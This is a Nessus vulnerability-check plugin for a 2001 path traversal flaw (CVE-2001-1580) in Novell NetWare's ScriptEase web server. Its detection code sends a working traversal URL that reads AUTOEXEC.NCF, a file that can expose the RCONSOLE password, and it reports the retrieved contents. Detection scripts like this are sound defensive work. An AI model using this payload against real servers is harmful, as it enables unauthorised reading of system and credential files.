#
# This script was written by David Kyger <david_kyger@symantec.com>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, output formatting, added see also, added solution (9/3/09)


include("compat.inc");

if(description)
{
  script_id(12048);
  script_version ("$Revision: 1.10 $");

  script_cve_id("CVE-2001-1580");
  script_bugtraq_id(3715); 
  script_xref(name:"OSVDB", value:"5325");
 
  script_name(english:"Novell NetWare Web Server sewse.nlm (viewcode.jse) Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JavaScript application that is
affected by an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of Nombas ScriptEase Web Server Edition for
NetWare on the remote host fails to sanitize input to the 'sewse.nlm'
page and associated 'viewcode.jse' script before using it to display
the source code of a file. 

By passing in a specially crafted URL argument, an attacker can view
the contents of files, even files outside the web root.  This can lead
to disclosure of sensitive information from the affected host, such as
the RCONSOLE password located in AUTOEXEC.NCF." );
 script_set_attribute(attribute:"see_also", value:"http://www.irmplc.com/index.php/113-Advisory-002" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-12/0200.html" );
 script_set_attribute(attribute:"solution", value:
"Remove all sample scripts from the web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


 script_summary(english:"Checks for NetWare Web Server Source Disclosure");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002-2009 David Kyger");

 script_family(english:"Netware");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

 
if(get_port_state(port))
 {
   url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if (isnull(buf)) exit(1, "The web server on port "+port+" failed to respond.");

   if ("AUTOEXEC.NCF" >< buf)
   {
     if (report_verbosity > 0)
     {
       report = string(
         "\n",
         "Nessus was able to exploit the issue to retrieve the contents of\n",
         "'AUTOEXEC.NCF' on the remote host using the following URL :\n",
         "\n",
         "  ", build_url(port:port, qs:url), "\n"
       );
       if (report_verbosity > 1)
       {
         report += string(
           "\n",
           "Here are its contents :\n",
           "\n",
           crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
           buf,
           crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
         );
       }
       security_warning(port:port, extra:report);
     }
     else security_warning(port);
    }
 }


